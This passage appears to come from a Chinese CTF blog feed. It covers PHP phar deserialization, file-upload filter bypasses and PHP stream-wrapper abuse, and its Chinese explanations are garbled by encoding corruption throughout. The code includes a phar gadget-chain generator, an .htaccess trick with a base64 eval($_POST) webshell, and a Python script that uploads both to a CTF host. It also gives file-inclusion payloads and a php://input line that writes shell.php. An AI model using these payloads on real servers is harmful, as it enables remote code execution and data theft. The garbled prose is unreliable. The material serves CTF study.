class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="comment">//flagæ‰€åœ¨è·¯å¾„</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;<span class="comment">//ä¸ºäº†ä¸å­˜åœ¨çš„è°ƒç”¨è§¦å‘__get()</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;<span class="comment">//è§¦å‘__toString()</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ å›¾ç‰‡ç±»å‹æ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//meta-dataå‚¨å­˜çš„ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//ç”Ÿæˆç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div><blockquote><p>è¦æƒ³ç”Ÿæˆpharæ–‡ä»¶ï¼Œå¿…é¡»å°†php.iniä¸­phar.readonlyé…ç½®é¡¹é…ç½®ä¸º0æˆ–Off,å¹¶ä¸”åˆ é™¤è¡Œé¦–åˆ†å·ï¼Œåœ¨è¡Œå°¾åŠ .</p><p>ç”Ÿæˆçš„pharä¸­metada.binå†…å®¹ä¸ºç±»åºåˆ—åŒ–åçš„å†…å®¹</p></blockquote><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="ç»•è¿‡-lt-è¿‡æ»¤"><a href="#ç»•è¿‡-lt-è¿‡æ»¤" class="headerlink" title="ç»•è¿‡&lt;?è¿‡æ»¤"></a>ç»•è¿‡&lt;?è¿‡æ»¤</h3><p>.htaccessç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥</p><p>å¦‚æœç”¨ä¸€èˆ¬çš„<code>GIF89a</code>æ–‡ä»¶å¤´ç»•è¿‡ï¼Œä¼šå¯¼è‡´htaccessæ–‡ä»¶æ— æ³•æ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œç”¨å®šä¹‰é«˜åº¦ä¸å®½åº¦ï¼Œ#åœ¨htaccessä¸­è¢«è§†ä¸ºæ³¨é‡Š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .a</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br></pre></td></tr></table></figure></div><p>shell.aå†…å®¹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a11</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure></div><blockquote><p>æ–‡ä»¶å¤´ååŠ çš„å†…å®¹æ˜¯ä¸ºäº†è¡¥è¶³8ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç è§„åˆ™</p></blockquote><h3 id="æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬"><a href="#æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬"></a>æ–‡ä»¶ä¸Šä¼ pythonè„šæœ¬</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="comment"># æ‰§è¡Œget_the_flagå‡½æ•°</span></span><br><span class="line">session = requests.session()</span><br><span class="line">htaccess_content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .a</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">files_htaccess = &#123;<span class="string">&#x27;file&#x27;</span>: (</span><br><span class="line">    <span class="string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">res_hta = session.post(url, files=files_htaccess)</span><br><span class="line"><span class="built_in">print</span>(res_hta.text)</span><br><span class="line">shell_file = <span class="string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span></span><br><span class="line">files_shell = &#123;<span class="string">&#x27;file&#x27;</span>: (</span><br><span class="line">    <span class="string">&#x27;shell.a&#x27;</span>, shell_file, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">res_jpg = session.post(url, files=files_shell)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res_jpg.text)  <span class="comment"># æ‰“å°è·¯å¾„</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¼ªåè®®</title>
      <link href="/2022/01/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/01/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><h2 id="å‰ç½®æ¡ä»¶â€“php-iniå‚æ•°è®¾ç½®"><a href="#å‰ç½®æ¡ä»¶â€“php-iniå‚æ•°è®¾ç½®" class="headerlink" title="å‰ç½®æ¡ä»¶â€“php.iniå‚æ•°è®¾ç½®"></a>å‰ç½®æ¡ä»¶â€“php.iniå‚æ•°è®¾ç½®</h2><p>allow_url_fopen:é»˜è®¤å€¼æ˜¯ONã€‚å…è®¸urlé‡Œçš„å°è£…åè®®è®¿é—®æ–‡ä»¶ï¼›</p><p>allow_url_include:é»˜è®¤å€¼æ˜¯OFFã€‚ä¸å…è®¸åŒ…å«urlé‡Œçš„å°è£…åè®®åŒ…å«æ–‡ä»¶ï¼›</p><h2 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h2><p>1ã€<code>include</code> 2ã€<code>require</code> 3ã€<code>include_once</code> 4ã€<code>require_once</code> 5ã€<code>highlight_file </code>6ã€<code>show_source</code> 7ã€<code>readfile</code></p><p>8ã€<code>file_get_contents </code>9ã€<code>fopen</code> 10ã€<code>file</code>(æ¯”è¾ƒå¸¸è§)</p><h2 id="phpæ”¯æŒçš„ä¼ªåè®®"><a href="#phpæ”¯æŒçš„ä¼ªåè®®" class="headerlink" title="phpæ”¯æŒçš„ä¼ªåè®®"></a>phpæ”¯æŒçš„ä¼ªåè®®</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// â€” è®¿é—® FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// â€” Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// â€” RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure></div><p><a class="link"   href="https://segmentfault.com/a/1190000018991087" >https://segmentfault.com/a/1190000018991087 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h2><p>è¯¥åè®®åœ¨åŒoffæƒ…å†µä¸‹ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ(æœ¬åœ°æŒ‡å®šçš„æ˜¯å½“å‰ç¯å¢ƒï¼Œctfä¸­çš„é¢˜ç›®ç¯å¢ƒ)</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://æ–‡ä»¶ç»å¯¹è·¯å¾„/ç½‘ç»œè·¯å¾„</span><br></pre></td></tr></table></figure></div><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>php:&#x2F;&#x2F;ä½œç”¨ä¸ºè®¿é—®è¾“å…¥è¾“å‡ºæµ</p><p>ä½¿ç”¨æ¡ä»¶ï¼š</p><p><strong>1. ä¸éœ€è¦å¼€å¯allow_url_fopen</strong></p><p><strong>2. php:&#x2F;&#x2F;inputã€ php:&#x2F;&#x2F;stdinã€ php:&#x2F;&#x2F;memory å’Œ php:&#x2F;&#x2F;temp éœ€è¦å¼€å¯allow_url_includeã€‚</strong></p><blockquote><p>php:&#x2F;&#x2F;filter ç”¨äºè¯»å–æºç ä¸”åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨</p></blockquote><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>è¯¥åè®®å¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp:&#x2F;&#x2F;filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç (é€šå¸¸base64)ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚</p><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»è¦å‡ºç°åœ¨åè®®ä¸­çš„ï¼Œå†³å®šäº†ä½ è¦è¯»å–çš„æ•°æ®æµ(æ–‡ä»¶)</td></tr><tr><td>read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ&#96;</td></tr><tr><td>write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ&#96;</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ <code>read=</code> æˆ– <code>write=</code> ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td></tr></tbody></table><blockquote><p>ä»¥ä¸‹ä¸¤ç§ç”¨æ³•ç›¸åŒ<br><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code><br><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code></p></blockquote><p>å¸¸è§payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php ä»¥base64ç¼–ç æ–¹å¼è¾“å‡ºæºç </span><br><span class="line">php://filter/resource=index.php</span><br></pre></td></tr></table></figure></div><blockquote><p>ä½¿ç”¨çš„convert.base64-encodeï¼Œå°±æ˜¯ä¸€ç§è¿‡æ»¤å™¨</p></blockquote><h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><p><strong>ä¸€ã€å­—ç¬¦ä¸²è¿‡æ»¤å™¨</strong></p><p>é€šå¸¸ä»¥<code>string</code>å¼€å¤´ï¼Œå¯¹æ¯ä¸ªå­—ç¬¦éƒ½è¿›è¡ŒåŒæ ·æ–¹å¼çš„å¤„ç†ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string.rot13  <span class="comment"># ä¸€ç§å­—ç¬¦å¤„ç†æ–¹å¼ï¼Œå­—ç¬¦å³ç§»åä¸‰ä½ã€‚</span></span><br><span class="line">string.toupper  <span class="comment"># å°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚</span></span><br><span class="line">string.tolower  <span class="comment"># å°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå°å†™ã€‚</span></span><br><span class="line">string.strip_tags  <span class="comment"># è¿™ä¸ªè¿‡æ»¤å™¨å°±æ¯”è¾ƒæœ‰æ„æ€ï¼Œç”¨æ¥å¤„ç†æ‰è¯»å…¥çš„æ‰€æœ‰æ ‡ç­¾ï¼Œä¾‹å¦‚XMLçš„ç­‰ç­‰ã€‚åœ¨ç»•è¿‡æ­»äº¡exitå¤§æœ‰ç”¨å¤„ã€‚</span></span><br></pre></td></tr></table></figure></div><p><strong>äºŒã€è½¬æ¢è¿‡æ»¤å™¨</strong></p><p>å¯¹æ•°æ®æµè¿›è¡Œç¼–ç ï¼Œé˜²æ­¢è¢«è§£ææ‰§è¡Œï¼Œé€šå¸¸ç”¨æ¥è¯»å–æ–‡ä»¶æºç ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert.base64-encode  <span class="comment"># base64åŠ å¯†</span></span><br><span class="line">convert.base64-decode  <span class="comment"># base64è§£å¯†</span></span><br><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode  </span><br><span class="line"><span class="comment"># å¯ä»¥ç¿»è¯‘ä¸ºå¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç ï¼Œä½¿ç”¨å¯ä»¥æ‰“å°çš„ASCIIç¼–ç çš„å­—ç¬¦è¡¨ç¤ºå„ç§ç¼–ç å½¢å¼ä¸‹çš„å­—ç¬¦ã€‚</span></span><br></pre></td></tr></table></figure></div><p><strong>ä¸‰ã€å‹ç¼©è¿‡æ»¤å™¨</strong></p><p>è¿™é‡Œçš„å‹ç¼©ä¸æ˜¯ç”Ÿæˆzipæ–‡ä»¶ï¼Œåªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</p><p><code>zlib.deflate</code>ï¼ˆå‹ç¼©ï¼‰</p><p><code>zlib.inflate</code>ï¼ˆè§£å‹ï¼‰</p><blockquote><p><code>bzip2.compress</code>å’Œ <code>bzip2.decompress</code>å·¥ä½œçš„æ–¹å¼ä¸ <a class="link"   href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020" >zlib <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> è¿‡æ»¤å™¨å¤§è‡´ç›¸åŒ</p></blockquote><p><strong>å››ã€åŠ å¯†è¿‡æ»¤å™¨</strong></p><p><code>mcrypt.*</code>å’Œ <code>mdecrypt.*</code>ä½¿ç”¨ libmcrypt æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚</p><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" >https://www.leavesongs.com/PENETRATION/php-filter-magic.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit"><a href="#åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit" class="headerlink" title="åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit"></a>åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit</h3><p>æ­»äº¡exitæŒ‡çš„æ˜¯åœ¨è¿›è¡Œå†™å…¥PHPæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°ä¸­çš„ä¸€ç§ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">//è¿™ä¼šä½¿phpæ–‡ä»¶å¼€å¤´å››exitå‡½æ•°ï¼Œæ— æ³•æ‰§è¡Œåç»­ä»£ç </span></span><br></pre></td></tr></table></figure></div><h4 id="base64decodeç»•è¿‡"><a href="#base64decodeç»•è¿‡" class="headerlink" title="base64decodeç»•è¿‡"></a>base64decodeç»•è¿‡</h4><p>åˆ©ç”¨php:&#x2F;&#x2F;filterçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>(æ­»äº¡exit)è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exit,å½“$content åŒ…å« <?php exit; ?>æ—¶ï¼Œè§£ç è¿‡ç¨‹ä¼šå…ˆå»é™¤è¯†åˆ«ä¸äº†çš„å­—ç¬¦ï¼Œ&lt; ; ? &gt;å’Œç©ºæ ¼ç­‰éƒ½å°†è¢«å»é™¤ï¼Œäºæ˜¯å‰©ä¸‹çš„å­—ç¬¦å°±åªæœ‰phpexitä»¥åŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦äº†ã€‚ç”±äºbase64æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå†æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¾‹å¦‚æ·»åŠ å­—ç¬¦â€™aâ€™åï¼Œå°†â€™phpexitaâ€™å½“åšä¸¤ç»„base64è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ç»•è¿‡è¿™ä¸ªæ­»äº¡exitäº†ã€‚</p><blockquote><p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦(a-z 0-9 A-Z)ï¼Œå½“PHPé‡åˆ°ä¸å¯è§£ç çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©æ€§çš„è·³è¿‡</p></blockquote><h4 id="strip-tagsç»•è¿‡"><a href="#strip-tagsç»•è¿‡" class="headerlink" title="strip_tagsç»•è¿‡"></a>strip_tagsç»•è¿‡</h4><p><code>&lt;?php exit; ?&gt;</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾,å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤,filteræ˜¯æ”¯æŒå¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚å¯ä»¥å…ˆå°†webshellç»è¿‡base64ç¼–ç ï¼Œstrip_tagså»é™¤æ­»äº¡exitä¹‹åï¼Œå†é€šè¿‡base64-decodeå¤åŸ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure></div><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>åˆ©ç”¨data:&#x2F;&#x2F; æ—¶ï¼ŒPHPé…ç½®æ–‡ä»¶éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_include</strong></p><p>å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></div><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>å°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ(è®°ä½è¦åŠ ä¸Šphpå¤´)</p><p>é‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php:&#x2F;&#x2F;inputç»•è¿‡</p><blockquote><p>å½“enctype&#x3D;â€multipart&#x2F;form-dataâ€çš„æ—¶å€™ <code>php://input</code> æ˜¯æ— æ•ˆçš„</p></blockquote><h3 id="è¯»å–POSTæ•°æ®"><a href="#è¯»å–POSTæ•°æ®" class="headerlink" title="è¯»å–POSTæ•°æ®"></a>è¯»å–POSTæ•°æ®</h3><p>php:&#x2F;&#x2F;inputå¯ä»¥è¯»å–POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®<br>åˆ©ç”¨php:&#x2F;&#x2F;input è¯»å–POSTæ•°æ®çš„æ—¶å€™ï¼Œallow_url_fopenå’Œallow_url_includeä¸éœ€è¦å¼€å¯<br>ç¤ºä¾‹ä»£ç å¦‚ä¸‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢ä»£ç è¾“å‡ºfile_get_contentså‡½æ•°è·å–çš„php:&#x2F;&#x2F;inputæ•°æ®ã€‚<br>æµ‹è¯•æ—¶ä¼ å…¥POSTæ•°æ®å­—ç¬¦ä¸²test<br>æœ€åä¼šåœ¨é¡µé¢å›æ˜¾å‡ºtest</p><h3 id="å†™å…¥æœ¨é©¬"><a href="#å†™å…¥æœ¨é©¬" class="headerlink" title="å†™å…¥æœ¨é©¬"></a>å†™å…¥æœ¨é©¬</h3><p>åˆ©ç”¨php:&#x2F;&#x2F;inputå†™å…¥æœ¨é©¬çš„æ—¶å€™ï¼ŒPHPé…ç½®æ–‡ä»¶åªéœ€è¦å¼€å¯allow_url_include<br>å¦‚æœPOSTä¼ å…¥çš„æ˜¯PHPä»£ç ï¼Œå°±å¯ä»¥å†™å…¥æœ¨é©¬<br>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å¦‚æœPOSTä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ‰§è¡Œå†™å…¥æœ¨é©¬çš„PHPä»£ç ï¼Œå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªæœ¨é©¬ï¼Œé€šè¿‡POSTæ–¹æ³•ä¼ å…¥çš„æ˜¯ä»¥ä¸‹ä»£ç <br><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code><br>åˆ©ç”¨php:&#x2F;&#x2F;inputä¼ å…¥æœ¨é©¬çš„PHPä»£ç <br><code>http&quot;//www.abc.com/xxx/file.php?file=php://input</code><br>æµ‹è¯•çš„ç»“æœå°±æ˜¯é€šè¿‡php:&#x2F;&#x2F;inputä¼ å…¥äº†è¿™ä¸ªä»£ç 